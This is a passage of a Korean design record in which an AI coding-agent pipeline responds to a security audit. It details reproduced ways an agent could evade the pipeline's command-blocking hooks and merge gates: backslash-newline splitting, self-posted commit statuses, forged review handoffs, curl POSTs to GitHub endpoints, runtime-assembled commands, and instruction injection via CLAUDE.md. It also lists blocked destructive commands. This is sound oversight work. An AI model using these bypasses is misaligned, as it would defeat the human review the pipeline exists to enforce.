- 정적 모드의 폴링 주기는 토큰 유무로 갈린다: 토큰 없음(시간당 60회) 10분, 토큰 있음(시간당 5000회) 2분.
- 이 세 가지를 뽑아낸 순수 함수 `planStaticPull`은 `factory/lib/board-static.js`에 있고, 페이지의 인라인 사본은 **글자 그대로 같은 텍스트**다(`board-page.test.js`가 두 소스를 바이트 단위로 비교한다).
- GitHub의 ratelimit 헤더는 403(예산 소진) 응답에도 실려 오므로, 위 skip 로직이 그 사실을 다음 폴에서 그대로 소비한다 — 즉시 재시도하는 루프가 없다.
- SSE의 두 방송 루프(`refresh`의 push, keepalive ping) 모두 `res.write`를 try/catch로 감싸고 죽은 클라이언트를 그 자리에서 버린다 — 하나가 끊겼다고 나머지가 밀리지 않는다.
- `--repo`의 `REPO_RE`는 `.`/`..` 세그먼트를 거부한다(`repos/../..`가 API 루트로 조용히 정규화되는 것을 애초에 허용하지 않는다).
- 페이지의 `?repo=`는 부팅 시 설정 폼과 **같은 정규식**으로 검사한다 — 실패하면 저장소 입력 화면으로 떨어진다(전에는 폼만 검사했고 쿼리 파라미터는 그대로 API 경로에 이어붙었다).
- SSE의 "바뀔 때만 민다"는 시간만 지나도 값이 움직이는 필드(`generated_at`·`fetched_at`·`*_min`·열린 타임라인 구간의 `to`)를 뺀 투영으로 비교해야 진짜다 — 예전 비교는 모델 전체 문자열이라 매 폴마다 밀었다(테스트가 시계를 고정해 둬서 가려져 있었다). 시계를 전진시키는 새 테스트가 "시간만 지나면 안 민다 / 상태가 바뀌면 민다"를 함께 증명한다.

---

## ADR-023 외부 감사 대응 — 재현된 우회를 스크립트가 막는 경계로 바꾼다 — 2026-09-14

**질문**: 2026-09-14, `2ab390c`에 대한 외부 감사(`docs/factory/audit/2026-09-14-external-audit.md`)가 훅을 직접 실행해 **리뷰를 건너뛰고 머지까지 가는 경로**를 재현했고, 게이트가 fail-open이며, 선언만 있고 배선되지 않은 통제가 여럿이라고 판정했다. 한 문장 요약은 "오케스트레이션은 구현했고 검증은 구현하지 않았다"였다. 대응은 `docs/superpowers/plans/2026-09-14-factory-audit-hardening.md`가 Task로 나눈다 — 이 ADR은 **감사 id ↔ Task ↔ 실제로 무엇이 바뀌었는가**의 대조표이고, 각 Task가 자기 항목을 채운다.

**원칙(이 대응 전체에 걸리는 것)**:
- 감사가 재현한 실패마다 **먼저 빨간 테스트**를 만들고 그 테스트를 고친다. 프로즈만의 통제는 코드로 배선하거나 그 주장을 문서에서 뺀다.
- 훅은 defense in depth다. 권한·그래프·requirements가 권위다 — 훅에서 막았다고 그 위층을 생략하지 않는다.
- fail-closed: 읽지 못한 입력은 GREEN도 "진행"도 되지 않는다.

**감사 id ↔ Task 대조표**

| 감사 id | 무엇이었나 | Task | 상태 |
|---|---|---|---|
| H1a | `block-dangerous.sh`가 줄 단위 매칭이라 `\`+개행 하나로 전 규칙 우회 | 1 | 닫힘 — 판정 전 정규화 |
| H1b | 스테이지가 자기 commit status를 게시해 머지 게이트를 염 | 1(훅)·2(게시자 검증)·batch-1(엔드포인트 앵커) | 닫힘 — 세 겹(정규화 + 게시자 검증 + 엔드포인트 앵커). 런타임 조립 동사는 여전히 비목표(아래 "남은 것") |
| H1c | `mergePr`가 리뷰 검증보다 먼저 | 2 | 닫힘 — 머지 직전 정족수·all-approve·K 재검증 |
| H2 | `recomputeStatus`가 `misconfigured`를 GREEN으로 | 3 | 닫힘 — fail-closed 7원칙 |
| H3 | tier 자기 신고, `tier_effective` 소비처 0 | 2(잠정 바닥)·4(단일 출처 `resolveTier`) | 닫힘 |
| H4 | `cold_read` 미구현 | 5 | 닫힘 — 역할별 `context.<role>.json` |
| H5 | 기존 테스트 삭제·단언 변경 탐지 없음 | 4 | 닫힘 — `tests-modified` policy 위반 |
| H6 | 인간 게이트가 사실상 없음 | 2 | 닫힘 — `merge.human_gate` 명시적 선언 |
| M6 | 죽은 훅 `check-merge-gate.sh`(`$TOOL_INPUT`) | 1 | 닫힘 — 파일·설정 항목 모두 제거 |
| M7 | 두 배우 모드에서 `FACTORY_MERGE_TOKEN \|\| FACTORY_BOT_TOKEN`이 무성 강등 | 2 | 닫힘 — 첫 스텝 가드(`two-actor-token-guard`)로 exit 1 |
| M8 | 보호 목록이 세 곳에 손으로, 실제로 갈라져 있었다 | 1 | 닫힘 — 생성 + `protected.parity` |
| M9 | harness 모드에서 `harness.toml`의 판정 기준 섹션 편집 가능 | 1 | 닫힘 — L1 `policy` 위반 |
| M1·M2·M13·M10/M11 | triage default-allow, prove-test base env, 중복 실행, lessons 증거 | 6 | **미착수** — 아래 "남은 것" |
| M3·M4·M12 | flaky 분류, quarantine 범위, docs tier 글롭 | 3·4 | 닫힘 |
| M5·P2-13 | `factory-loader` LLM 호출, `on_others` 미소비 | 5 | 닫힘 |
| P2-10/11 | 단일 에이전트 plan baseline 실험 | 7·9 | 닫힘 — 실험 완료(n=4), plan 기본값을 단일 패스로 변경 |
| P2-15 | 리뷰어 한 명을 다른 프로바이더로 | — | 소유자 결정(두 번째 키가 필요하다) — 구현하지 않는다 |
| (감사 밖, KTB-37) | 스테이지가 PR head 설정(훅·프롬프트·CHARTER)으로 자기 자신을 심판 | 8 | 닫힘 — 팩토리 설정 overlay + fail-closed. 도그푸딩(KTB #3)에서 발견, 원 감사에는 없는 항목 |
| (감사 밖, KTB-37 이월) | rework 라운드의 세션 내 체크아웃이 팩토리 브랜치를 직접 소유하지 않음 | 8b | **미착수** — 아래 "남은 것" |

### Task 1 — 훅 정규화 · 상태/승인 위조 · 보호 목록 단일 출처 (H1a, H1b, M6, M8, M9)

**재현한 것 → 막은 것**

- **H1a (재현)**. `factory/test/hooks.test.js`의 "backslash-newline continuations are joined before matching"이 감사의 케이스를 그대로 실행해 **exit 0**을 받았다: `gh pr \⏎merge 5 --squash`, `git push origin \⏎--force main`, `gh issue edit 7 \⏎--add-label factory:approved`, `git \⏎merge feature`, `rm -rf \⏎.factory/lib`, `gh api \⏎-X DELETE …/factory/lock-7`. 원인은 모든 규칙이 `echo "$c" | grep -E`, 곧 **줄 단위**였다는 것이다 — 셸에서 `\`+개행은 토큰을 잇는데 훅이 보는 줄은 쪼개진다. **고친 방법**: 판정 **전에** 명령을 한 문자열로 정규화한다 — (1) `\`+개행 → 공백, (2) 남은 개행 → `;`, (3) 탭 → 공백, 공백 런 → 하나. 개행을 공백이 아니라 `;`로 바꾸는 것이 요점이다: 개행은 이음줄이 아닐 때 **명령 구분자**이고, 규칙들의 `[^;&|]*`·경계 클래스가 이미 `;`를 그렇게 읽는다. 공백으로 이으면 `echo git⏎merge x`가 없던 매치를 만든다 — 오탐을 새로 만드는 정규화는 정규화가 아니다(그 사실을 고정하는 테스트가 따로 있다). 같은 결함이 `deny-all-writes.sh`에도 있었다(감사는 재현하지 않았지만 `rm \⏎-rf src`가 통과한다) — 같은 정규화를 넣었다.
- **H1b (재현)**. `mergeGates`가 리뷰의 증거로 보는 것은 required check의 **상태**뿐이고(`run-stage.js` → `gh.js` `allChecksGreen`) 게시자를 검증하지 않는다. 모든 스테이지 env의 `FACTORY_BOT_TOKEN`은 `repo` 스코프라 commit status를 쓸 수 있고, 훅에는 그 규칙이 없었다. **막은 것**: `gh api …/statuses/…`(메서드·호스트 접두 불문), `gh api …/check-runs`, `gh api …/commits/<sha>/{status,check-runs}`, `gh pr review --approve`, `gh api …/pulls/<n>/reviews`. 읽기(GET)까지 막히지만 체크 상태를 읽어야 하는 역할이 없고 `gh pr checks`는 열려 있다. **범위 밖(이 Task)**: 상태의 **게시자 검증**은 머지 스테이지의 일이라 Task 2가 한다 — 훅만으로는 "봇이 아닌 누군가가 올린 green"을 구별할 수 없다. 그리고 **런타임에 조립되는 동사**(`x=$(printf "gh pr merge"); $x`, `node -e "execSync(…)"`)는 여전히 비목표다(ADR-020 잔여 위험 #4): 문자열에 동사가 연속으로 나타나지 않으면 이 훅은 볼 수 없고, 그 경계는 ADR-021의 **토큰 분리**가 맡는다.
- **M6 (죽은 훅)**. `.claude/hooks/check-merge-gate.sh`는 `$TOOL_INPUT`을 읽었다 — Claude Code가 세우지 않는 변수라 **항상 첫 줄에서 exit 0**이었다. 스펙 §1581이 이미 삭제를 적어 두었는데도 파일과 `settings.json` 항목이 남아 "머지 게이트 훅이 걸려 있다"는 그림만 만들었다. 유령 게이트는 없는 게이트보다 나쁘다 — 사람이 그것을 세기 때문이다. 파일을 지우고 항목을 뺐고, `mergeSettings`가 가산적이라 `--upgrade`로는 사라지지 않으므로 `pruneDeadHooks`를 설치기에 넣어 **채택자의 설치본에서도** 배선이 풀리고 파일이 삭제되게 했다.
- **M8 (보호 목록 세 곳)**. 실제 드리프트를 확인했다: 훅은 `.github/workflows/factory-`만 막는데 `[protected].factory`는 `.github/**` 전부를 보호하고(= 다른 이름의 워크플로 한 장이 훅을 그대로 지나갔다), 훅의 harness 변형은 `.factory/(bin|lib|actions|lessons|out)`만 열거하는데 ci-settings는 `scenarios`·`node_modules`까지 막는다. **고친 방법**: `harness.toml [protected]`가 단일 출처가 되고, `factory init`/`--upgrade`가 `factory/lib/protected-paths.js`로 (a) 훅의 `prot`(마커로 둘러싼 생성 블록)와 (b) ci-settings 두 파일의 `Edit(...)`/`Write(...)` deny를 **생성한다**. 템플릿의 ci-settings에는 이제 비경로 항목만 남는다(= 세 번째 손 목록이 사라졌다). doctor에 `protected.parity`를 더해 드리프트를 **FAIL**로 잡는다(WARN이면 그 경고를 안고 사는 동안 훅과 L2가 서로 다른 파일을 막는다). KTB-36의 `.factory/…` 열거와 `.factory/out/qa/**` 카브아웃은 그대로 보존된다 — `.factory/**`는 생성기가 형제 경로 열거로 펴고, 훅에서는 기존 `$qa` sed가 계속 그 일을 한다.
  - **머지 경계 ≠ 쓰기 경계**. `[protected].factory`는 "이 경로를 건드린 PR은 사람이 머지한다"(L1)이고, 생성되는 deny/`prot`는 "에이전트 세션이 이 파일을 쓰지 못한다"(L2/훅)다. 이 저장소에서는 `factory/**`·`templates/**`·`bin/**`가 둘의 갈라지는 유일한 자리다 — 팩토리의 소스가 곧 제품이라 builder가 그것을 편집하는 것이 정상 업무인데(쓰기는 열려야 한다), 그 diff는 모든 게이트의 정의를 바꾼다(자동 머지는 안 된다). 그 예외를 코드가 아니라 **설정**으로 선언하려고 `[protected].agent_writable`을 새로 두었다(템플릿 기본값은 빈 목록).
- **M9 (harness 모드의 얼어붙은 섹션)**. `FACTORY_HARNESS_ISSUE=1`이면 builder가 `.factory/harness.toml`을 편집할 수 있다(KTB-20 — 승격이 하려는 일이 바로 그것이다). 그런데 `[protected]`·`[gates.thresholds]`·`[load_bearing]`은 **판정 기준 자체**라, 거기를 고치면 그 PR이 스스로를 통과시킨다(보호 목록에서 자기를 빼거나, coverage 임계값을 낮추거나, 하중 경로를 비운다). **훅 규칙은 답이 될 수 없다 — 그리고 그 이유가 이 항목의 핵심이다**: 훅이 보는 것은 명령줄과 `Edit/Write`의 `file_path`뿐이라 "이 편집이 **어느 TOML 섹션**에 떨어지는가"를 알 방법이 없다. 그 판정은 **내용 기반**이고 diff를 읽어야 성립한다. 같은 이유로 L2 경로 deny도 안 된다(경로는 하나고 섹션은 여럿이다). 그래서 `integrity.js`의 섹션 diff 기계(`additive_only`와 같은 자리)에 얹어 **L1 `policy` 위반**(사람 머지)으로 집행한다 — 변조(`violations`)가 아니다: L0가 RED가 되면 required context가 빨개져 사람조차 머지할 수 없다(KTB-5/KTB-6과 같은 이유). 추가된 줄은 head 내용으로, 삭제된 줄은 base 내용(`git show <base>:<file>`)으로 섹션을 판정하고, 섹션 헤더 자체의 추가·삭제도 위반이다(주입된 헤더가 자기 주변 줄을 소급 정당화할 수 없다 — additive-only가 이미 쓰는 규칙). `FACTORY_HARNESS_ISSUE` 여부로 조건을 달지 **않는다**: 그 변수는 에이전트 세션의 env이고 integrity 잡·머지 스테이지에는 서 있지 않다 — 신뢰할 수 없는 입력에 판정을 맡기지 않는다(평범한 이슈에서는 harness.toml이 이미 `[protected]`라 판정이 같다).

**다른 방법을 택하지 않은 이유**
- 훅의 `prot`를 `{{PROTECTED_RE}}` 치환으로 만들지 않았다 — 그러면 `factory/hooks/block-dangerous.sh` 원본이 그 자체로 실행되지 않고, 테스트와 doctor의 `checkHooks`가 **설치되지 않을 파일**을 검사하게 된다. 대신 원본은 템플릿 harness로 생성된 블록을 들고 있고(=새 채택자가 받는 목록), 설치기가 그 블록만 다시 쓴다. 자기 미러 테스트의 비교 기준도 "소스 바이트"에서 "`freshContent`가 쓸 내용"으로 옮겼다 — 설치가 쓰는 것과 검사하는 것이 같은 함수여야 한다.
- `[protected].except`는 쓰기 목록에서 빼지 않는다. `except`는 **머지 면제**(자동 머지해도 되는 경로)이지 쓰기 허가가 아니다 — `.factory/lessons/**`는 retro만 쓴다.

**남은 위험(등록부)**
- 런타임 조립 동사는 여전히 이 훅의 비목표다(위 H1b 참조).
- `protected.parity`는 **설치본**을 본다 — 누군가 훅을 고치고 doctor를 돌리지 않으면 CI의 sweeper가 doctor를 돌릴 때까지 알려지지 않는다.
- 생성기의 `.factory/**` 열거와 harness-mode 개방 목록은 코드 상수다(`FACTORY_ENUM`·`HARNESS_OPENS`). 보호 **경로**의 목록은 아니지만(그것은 harness.toml에 있다) 새 `.factory` 하위 디렉터리가 생기면 손이 필요하다 — 템플릿 트리를 훑는 `templates.test.js`의 열거 테스트가 그 사고를 잡는다.

### 리뷰 batch-1 — 훅의 앵커를 클라이언트에서 엔드포인트로, 리뷰 증거에 출처를 (H1b-a, H1b-b)

batch 1(Task 1/2/3/8)에 대한 적대적 재리뷰(`scratchpad/review-audit-batch1-report.md`)가 **같은 H1 체인이
여전히 끝까지 실행된다**고 판정했다. 두 구멍 다 "동사가 명령줄에 그대로 있는데 규칙이 한 글자에 빗나갔다"는
H1a·MF-3과 같은 계열이다.

- **H1b-a — 규칙이 `gh`에 앵커돼 있었다.** 위 Task 1의 H1b 규칙은 전부 리터럴 `gh`로 시작한다. 그런데 모든
  스테이지 env에 `GH_TOKEN`이 있으므로 `curl -X POST …/statuses/<sha>`·`wget --method=POST`·httpie·
  `node -e fetch(…)`가 같은 일을 하고, 재리뷰가 실행해 확인한 rc=0 목록은 statuses·check-runs·
  `pulls/N/reviews`·`pulls/N/merge`·`issues/N/labels`·`git/refs`(락 삭제)·`branches/*/protection`
  **전부**였다. GraphQL(`addPullRequestReview`·`mergePullRequest`)은 세 번째 철자였다.
  **막은 것**: 앵커를 **경로**로 옮겼다 — 권한 엔드포인트(`/statuses/`·`/check-runs`·`/commits/<sha>/status`·
  `/pulls/<n>/(reviews|merge)`·`/issues/<n>/labels`·`/labels/`·`/git/refs`·`/branches/<b>/protection`·
  `/rulesets`·`/environments/`)가 보이고, HTTP 클라이언트가 있고, **쓰기 모양**(메서드 플래그·본문 플래그·
  httpie의 맨몸 동사)이면 클라이언트가 무엇이든 차단한다. GraphQL은 뮤테이션 **이름**으로 막는다.
  `api.github.com`이 아니라 경로에 앵커한 이유는 GHES 호스트다. **읽기(GET)는 그대로 열려 있다** — 새
  규칙은 쓰기 모양에만 문다(기존 `gh api` 규칙들은 메서드 불문 그대로 남는다).
- **H1b-b — 리뷰 증거에 출처가 없었다.** 정족수 검사가 읽는 것은 review handoff **코멘트**뿐인데,
  `gh issue comment`는 훅이 일부러 열어 둔 문이고 `parseHandoffs`는 작성자조차 남기지 않으며
  `creator.login` 대조는 **에이전트가 쥔 바로 그 계정**을 통과시킨다. 곧 all-approve handoff를 지어내면
  머지까지 갔다. **막은 것**: 판정의 재료를 에이전트가 쓸 수 없는 자리에 하나 더 뒀다 — review 스테이지가
  `claude -p`가 **끝난 뒤** run 기록에 쓰는 `review-evidence:` 한 줄(`run-record.js`)이고, 그 기록은
  `factory/records` 브랜치로 나간다. 머지 스테이지는 handoff와 그 줄이 **같은 커밋·같은 verdict 집합·같은
  라운드**일 때만 머지한다(`review-quorum.js` `verifyReviewProvenance`, merge-stage §(6b2)); 어긋나거나
  없으면 `review evidence not bound to a factory run`으로 needs-human이다. sha는 handoff가 적은 값이 아니라
  **스테이지가 실제로 체크아웃한 커밋**이다. 그 브랜치도 함께 잠갔다: 훅이 `git push … factory/records`와
  `factory/lock*`(및 REST `git/refs` 철자)를 전부 막고, `bootstrap`이 `factory/records`에
  force-push·삭제 금지 보호를 걸며, doctor가 `protection.records`로 그 상태를 매 실행에서 말한다.
- **MF-3 — `CLAUDE.md`·`.mcp.json`은 overlay 밖이었다**(Task 8). 둘 다 PR head가 쥐고 있고 `claude -p`가
  프로젝트 지시문·MCP 서버로 읽는데, `OVERLAY_ROOTS`에도 drift 검사에도 없었다 — 리뷰 세션으로 가는 곧은
  지시문 주입 경로이고, 보호 경로가 아니라 그 PR은 자동 머지까지 됐다. 셋(`AGENTS.md` 포함)을 overlay
  루트에 넣고, **PR이 추가한** 파일을 overlay가 직접 지우며(`git checkout <sha> -- …`는 추가 파일을 남긴다),
  drift 검사를 `claude -p` **앞에서도** 한 번 돌린다.
- **잠정 tier 바닥**(Task 4까지). 로스터 크기 = 정족수인데 tier가 triage의 자기 신고였다 — 낮춰 신고하면
  새 정족수 검사도 함께 약해진다. `reviewRoster()`가 `gates.json`의 `tier_effective`와 `maxTier`를 취한다:
  자기 신고는 tier를 올릴 수는 있어도 내릴 수는 없다.

**남은 위험(등록부에 추가)**
1. **리뷰 증거는 여전히 자격증명 하나 깊이다.** 러너와 에이전트가 같은 PAT을 쓴다 — 훅이 보지 못하는 철자
   (런타임 조립, ADR-020 잔여 위험 #4)로 `factory/records`에 append가 나가면 위의 바인딩도 함께 무너진다.
   `restrictions`로 push를 머지 배우에 묶을 수는 **없다**: 기록을 쓰는 것은 모든 스테이지의 러너이고,
   좁히면 증거를 지키려다 증거를 없앤다. 진짜 분리는 두 번째 배우이거나 Actions 실행 증명이고,
   그것이 다음 주기의 P0다.
2. **`factory/records` 보호는 플랜에 달려 있다.** GitHub Free의 private 저장소에서는 걸리지 않는다 — 그때
   증거를 지키는 것은 훅 하나뿐이고, bootstrap과 doctor가 그 문장을 그대로 말한다.
3. **훅은 여전히 `Bash(*)` 위의 철자 매처다.** 엔드포인트 앵커는 클라이언트 열거보다 오래가지만, 근본
   해결은 에이전트 세션의 env에서 `GH_TOKEN`을 빼고 모든 GitHub 변경을 러너의 `gh` 래퍼로 보내는 것이다.
4. **`CLAUDE.md`·`.mcp.json`은 아직 `[protected].factory`가 아니다.** overlay가 스테이지 **안에서는**
   base의 것으로 만들지만, 그 파일을 고친 PR의 자동 머지를 막지는 않는다 — `[protected]` 편입은
   훅 `prot`·ci-settings 생성 블록을 함께 다시 써야 하므로 별도 변경으로 남긴다.

---

### Task 2 — 리뷰는 머지 전에 검증되고, 인간 게이트는 명시적 선택이다 (H1c, H1b 게시자 검증, H6, M7)

**질문**: H1c는 `merge-stage.js`가 `mergePr`(:476)를 리뷰 handoff를 한 번도 읽지 않고 부른 **뒤에야**
`transition("factory:merged")`(:487)를 부른다고 지적했다 — 되돌릴 수 없는 단계의 마지막 방어선이 비어
있었다. H6는 사람의 서명이 토큰 등록 1회뿐인데 그 상태 자체가 어디에도 선언돼 있지 않다고 지적했다.
M7은 두 배우 모드의 `GH_TOKEN: ${{ secrets.FACTORY_MERGE_TOKEN || secrets.FACTORY_BOT_TOKEN }}` 폴백이
두 배우 모드에서도 조용히 작동해, 환경이 안 걸리거나 시크릿이 지워지면 로그 한 줄 없이 에이전트 배우의
토큰으로 머지된다고 지적했다. Task 1이 훅으로만 막은 H1b(상태 게시자 미검증)의 나머지 절반도 여기서
닫는다.

**관측**:
- `factory:merged` 규칙은 리뷰 handoff의 존재와 스키마만 봤다 — 정족수·all-approve는 `factory:approved`
  규칙에만 있었고, 그 라벨이 붙은 뒤에는 아무도 다시 세지 않았다.
- `mergeGates`의 유일한 리뷰 증거는 required check 상태(`allChecksGreen`)였고 그 함수는 `context`와
  `state`만 본다 — `repo` 스코프의 봇 토큰이 `gh api -X POST /repos/o/r/statuses/<sha> -f state=success
  -f context=factory/review`를 실제로 낼 수 있었다.
- `MERGE_ENVIRONMENT_BODY`는 `deployment_branch_policy`만 규정했다 — *토큰이 어디로 새는가*의
  통제이지 *사람이 봤는가*가 아니다. 다크 여부를 아무도 선언한 적이 없는데 전 저장소가 다크였다.

**결정**: 머지 스테이지에 두 겹을 더하고, 인간 게이트를 CHARTER의 명시적 필드로 승격한다.

#### H1c — 머지 직전 리뷰 검증 (`merge-stage.js` §6b)
`approvePr`보다 앞에서 라이브 PR head로 네 가지를 다시 묻는다: ① 그 sha에 묶인 `review.v1` handoff가
있는가, ② 정족수(tier 로스터 크기)+all-approve — handoff의 자기 신고 `decision`이 아니라 `must_fix`에서
`aggregate.js`로 재계산(`review-quorum.js`), ③ `round ≤ K`, ④ `factory/review`·`factory/gates` 상태의
`creator.login`이 팩토리 계정인가. 하나라도 확인 불가면 GREEN이 아니라 `factory:needs-human`이고,
사유는 전이 코멘트·run 기록에 정확한 한 줄로 남는다. 새 파일 `factory/lib/review-quorum.js`가
"리뷰가 통과했다"의 유일한 판정처다 — `factory:approved` 규칙, `factory:merged` 규칙, 머지 스테이지
셋이 같은 함수를 부른다. **K는 여전히 `factory:approved`에는 걸지 않는다**(ADR-020 KTB-29 r1 SF1
유지 — 실패를 끊는 한도이지 성공을 막는 한도가 아니다). merge는 `buildContext`를 거치지 않으므로
`buildCtxExtra`가 CHARTER에서 읽은 로스터와 K를 직접 받도록 배선했다 — 규칙에 검사를 넣는 것과 그
검사가 실제로 물리는 것은 다른 일이었다. 재현 테스트: `merge-stage.test.js`의
`H1c: with no review-evidence deps wired the stage refuses to merge` 외 5건, `requirements.test.js`의
`H1c: factory:merged re-checks quorum, all-approve … and K`, `run-stage.test.js`의
`H1c: the merged transition carries a roster and K even with no ctx`.

#### H1b(게시자 검증) — 상태에 출처를 묻는다
`gh.commitStatuses(sha)`를 신설했다 — `GET /repos/{repo}/commits/{sha}/statuses`만 항목마다 `creator`를
준다(combined status API도 `gh pr checks`도 안 준다). 두 배우 모드에서는 이 잡의 `GH_TOKEN`이 머지
배우인데 `factory/review`를 올린 것은 에이전트 배우이므로, `factory-merge.yml`에
`Resolve the agent actor's login` 스텝을 붙여 봇 토큰으로 `gh api user`를 한 번 불러 로그인 이름을
`FACTORY_BOT_LOGIN`으로 넘긴다. 로그인조차 못 구하면 fail closed. 재현:
`H1b: a factory/review status posted by an account that is not the factory does not merge`,
`…a missing factory/gates status on the PR head does not merge`,
`…an unresolvable factory login fails closed`.

#### H6 — 인간 게이트는 CHARTER의 명시적 선택이 됐다
frontmatter `merge: { human_gate: true|false }`. `loadCharter`는 기본값을 채우지 않는다 — "없음"과
"false"는 다른 사실이다.

| 상태 | bootstrap | doctor |
|---|---|---|
| `true` | `factory-merge` 환경에 소유자를 required reviewer로 건다 — 모든 머지 잡이 사람 앞에서 멈춘다 | PASS `charter.merge-human-gate` |
| `false` | 리뷰어 없음 + 무엇을 잃는지 말하는 note | WARN `merge.dark — no per-PR human signature (merge.human_gate=false)` |
| 없음 | `true`로 읽는다(fail closed — 다크는 기본값이 아니다) | **FAIL** `charter.merge-human-gate-unset` |

소유자 id는 `gh api user`의 `id`로 얻는다; 못 얻으면 `reviewers`를 넣지 않는다(빈 리뷰어로 PUT하면
422로 환경 자체가 안 만들어져 시크릿 보호까지 잃는다) — 그 공백은 note가 이름으로 말한다. 머지 전이
텍스트(`humanGateNote`)가 사람이 서명했는지·다크였는지·선언 자체가 없었는지를 이슈 코멘트와 run
기록에 매번 남긴다. **KTB 자신은 `false`다** — 다크 루프를 증명하는 것 자체가 산출물이고, 대가(토큰
등록 1회)를 감당할 수 있는 이유(저장소 하나·소유자 한 명·전부 squash)를 CHARTER에 적어 뒀다.
**채택 저장소 템플릿 기본값은 `true`다** — 남의 코드베이스에 다크 머지를 기본으로 심지 않는다.

#### M7 — 두 배우 모드의 무성 강등을 막는다
`factory-merge.yml`의 **첫 스텝**(`id: two-actor-token-guard`, 체크아웃보다 앞)이
`vars.FACTORY_TWO_ACTOR == 'true'`인데 `secrets.FACTORY_MERGE_TOKEN == ''`이면 `exit 1`한다. 폴백
자체는 단일 배우 모드를 위해 남는다. `yml-lint`의 `merge-token-required-when-two-actor`가 "폴백이
있으면 가드 스텝도 있어야 한다"를 고정한다(열쇠는 `id:` — `merge-token-scope`의 스크럽 예외와 같은
방식).

**알려진 한계**:
- 게시자 확인은 *제3자의* 위조와 *상태 자체의 부재*만 거른다 — 에이전트 배우 **자신**의 위조는 훅
  (Task 1)과 정족수 재계산(H1c) 두 겹이 맡는다. 근본 해결(리뷰 증거를 커밋 상태가 아니라 서명된
  산출물로 옮기는 것)은 이 사이클 밖이다.
- `FACTORY_BOT_LOGIN`은 워크플로가 넘기는 값이다 — 워크플로를 고칠 수 있는 주체는 이 값을 속일 수
  있고, 그 지점의 방어선은 린트가 아니라 L1(`.github/**`가 `[protected].factory`)이다.
- tier는 이 시점까지도 triage handoff의 자기 신고였다 — `reviewRoster()`가 자기 신고와
  `gates.json.tier_effective`를 `maxTier`로 합쳐 **잠정 바닥**을 세웠다(올릴 수는 있어도 내릴 수는
  없다). 단일 출처(`resolveTier()`)로 정리하는 것은 Task 4의 몫이다 — Task 4가 머지될 때 이 잠정
  계산은 삭제됐다.
- 리뷰 증거는 여전히 자격증명 하나 깊이다(러너와 에이전트가 같은 PAT) — 이 잔여 위험은 batch-1
  재리뷰가 다시 다룬다(아래).

**영향**: `factory/lib/merge-stage.js`(§6b), `factory/lib/review-quorum.js`(신규), `factory/lib/requirements.js`
(`factory:merged`), `factory/lib/gh.js`(`commitStatuses`), `factory/bin/run-stage.js`(`buildCtxExtra`),
`factory/lib/bootstrap.js`(`merge.human_gate` 처리), `factory/cli/bootstrap.js`,
`templates/factory/github/workflows/factory-merge.yml`(로그인 해석 스텝·가드 스텝),
`templates/factory/docs/factory/CHARTER.md`(`merge.human_gate: true`), `docs/factory/CHARTER.md`
(KTB 자신 — `false`, 이유 절). 테스트: `merge-stage.test.js`, `requirements.test.js`,
`run-stage.test.js`, `doctor-merge-authority.test.js`, `bootstrap.test.js`, `yml-lint.test.js`.

---

### Task 3 — 게이트는 게이트다: fail-closed 7원칙 (H2, P1-5/6/7, M3, M4)

**질문**: 실측 한 줄이 게이트 계층을 무효화했다 — `status=GREEN misconfigured=prove-test,new-test-repeat,
diff_coverage,mutation`. required 8개 중 5개가 한 번도 돌지 않은 PR이 GREEN이었다. 원인 다섯이 서로를
받치고 있었다: ① `recomputeStatus`가 `misconfigured`를 판정에 안 썼다(required가 아니면 무시), ②
`required`를 `names.includes(n)`으로 걸러 레벨 목록에 없는 required 게이트는 "확인 대상 아님"이 됐다,
③ `prove-test`/`new-test-repeat`가 레벨 목록 밖에서 사후 주입돼 애초에 required가 될 수 없었다, ④
`harness.toml`의 `fast`/`full`/`deep`이 글자 그대로 같고 `lint = "node -e 0"`이라 tier→level이 아무것도
정하지 않았다(그 구성 그대로 템플릿이 배포됐다), ⑤ `gates.test.js`의 단언이 이 동작을 정답으로 고정하고
있었다. 여기에 flaky/격리 두 개가 더 붙는다: base 5/5 실패도 `flaky-existing`으로 불려 제외됐고(M3),
격리는 스테이지·PR을 가리지 않고 RED를 GREEN으로 뒤집었다(M4).

**관측**: 다섯 결함이 서로를 받쳐 주는 구조라는 것이 핵심이다 — 하나만 고치면 나머지가 같은 구멍을
다시 연다(①만 고쳐도 ③ 때문에 증명 게이트는 여전히 required가 될 수 없다).

**결정**: 게이트는 fail-closed다. 모르면 GREEN이 아니다.

#### H2 — 설정 오류는 통과가 아니다
`recomputeStatus`: `misconfigured.length || requiredMissing.length → MISCONFIGURED`(exit 2, `success`가
아니다). `required`에서 `names.includes(n)` 필터를 뺐다 — required 게이트가 이번 레벨에서 안 돌았으면
(목록에 없어서든, 명령이 없어서든, SKIPPED로 남았든) MISCONFIGURED다. `prove-test`·`new-test-repeat`도
`diff_coverage`·`mutation`과 같은 `DEFERRED_GATES`로 레벨의 정식 멤버가 됐다 — 목록에 있으면 SKIPPED
자리를 먼저 잡고 스테이지가 잰 뒤 채운다. 커밋 상태는 `commitStatusState()` 한 함수로 모았다: GREEN
하나만 `success`, RED·MISCONFIGURED·BLOCKED·판정 없음은 전부 `failure`. doctor
`gates.required-in-levels`가 required와 레벨 목록의 짝을 맞춘다.

레벨은 서로 달라야 한다: 템플릿 `fast=[lint,unit]`, `full=fast+[prove-test,new-test-repeat]`,
`deep=full`(+ 설정되는 대로 `integration`/`e2e`/`diff_coverage`/`mutation`). doctor
`gates.levels-identical`: `full`이 `fast`에 아무것도 안 더하면 FAIL, `deep`이 `full`을 포함 안 하면
FAIL, `deep==full`인데 설정은 됐으나 목록에 없는 게이트가 있으면 FAIL(신규 M0 저장소의 `deep==full`은
PASS — 아무도 못 고치는 경고를 상시로 안 띄운다). `MAX_LEVEL.M0="fast"` 강등은 유지하되 조용하지
않다 — 판정 파일의 `downgraded_from`과 doctor `gates.m0-downgrade` WARN 두 자리에 남긴다.

#### P1-7 — no-op lint는 게이트가 아니다
doctor `gates.lint-noop` FAIL: `node -e 0`, `node -e ""`, `true`, `:`, 빈 문자열(텍스트 판정이라
`node -e 'process.exit(0)'`는 못 잡는다 — 목표는 "린터 붙일 때까지"의 자리표시자가 그대로 배포되는
관성을 막는 것). KTB 자신의 lint는 `factory/bin/lint.js`로 교체했다(새 의존성 없음): `node --check`
(바뀐 JS) + `yml-lint.js`(ADR-009/021 워크플로 규칙) + `skill-md.js`. Workflow 툴 스크립트
(`**/claude/workflows/**`)는 최상위 `return`을 쓰는 함수 본문이라 `--check` 대상에서 뺐다
(`workflows.test.js`가 그 계약을 검사).

